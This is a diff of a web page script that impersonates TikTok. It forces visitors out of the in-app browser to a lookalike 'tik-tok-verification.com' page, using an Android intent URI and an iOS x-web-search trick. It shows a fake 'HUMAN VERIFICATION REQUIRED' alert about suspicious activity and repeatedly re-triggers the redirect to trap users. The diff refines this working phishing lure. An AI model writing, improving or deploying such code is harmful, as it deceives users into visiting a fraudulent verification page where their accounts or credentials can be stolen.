@@ -11,55 +11,48 @@
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 15000;
 
-    function forceExternalBrowser() {
+    function forceDefaultBrowser() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const urlNoProtocol = targetUrl.replace("https://", "");
-
+        
         if (isAndroid) {
-            // Android 'Intent' is the most reliable way to force Chrome/External
-            const androidIntent = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
-            window.location.replace(androidIntent);
+            // Android: This "Generic Intent" targets the DEFAULT browser, not just Chrome
+            window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
         } else {
-            // iOS: We use the 'Safari-Direct' trigger
-            // Opening an 'https' link via a search-term to a system-app often forces the "Open in Safari?" prompt
-            const iosJump = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + encodeURIComponent(targetUrl);
-            window.location.assign(iosJump);
+            // iOS: Using the 'x-web-search' trick to force the "Open in Safari" prompt
+            // This bypasses the TikTok webview by triggering a system-level URI
+            window.location.href = "x-web-search://?" + encodeURIComponent(targetUrl);
             
-            // Immediately attempt a direct window open as a backup
+            // Fail-safe: Direct assignment in case the protocol is blocked
             setTimeout(() => {
-                window.location.href = targetUrl;
+                window.location.assign(targetUrl);
             }, 100);
         }
     }
 
-    function securityEngine() {
+    function runLock() {
         if (Date.now() > killTime) return;
 
-        // 1. Initial attempt
-        forceExternalBrowser();
+        // 1. Initial jump attempt
+        forceDefaultBrowser();
 
-        // 2. The Check (Focus detection)
+        // 2. Focus Check (Wait 320ms for OS to respond)
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
-                // Shortened line by 5+ characters as requested
                 const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                 
-                // The Alert pauses everything.
                 alert(header + body);
 
-                // 3. THE RELAY: Firing immediately after the "OK" tap gesture.
-                // This is the moment the OS is most likely to allow an external app jump.
-                forceExternalBrowser();
+                // 3. RELAY: Firing immediately after OK to use the tap gesture
+                forceDefaultBrowser();
 
-                // Recurse to catch them if they try to stay
-                setTimeout(securityEngine, 200);
+                setTimeout(runLock, 320);
             }
-        }, 250); // Small window to allow the OS to register the first jump
+        }, 320);
     }
 
-    window.onload = securityEngine;
-    window.onfocus = () => { if (Date.now() < killTime) securityEngine(); };
+    window.onload = runLock;
+    window.onfocus = () => { if (Date.now() < killTime) runLock(); };
 </script>
 
 </body>
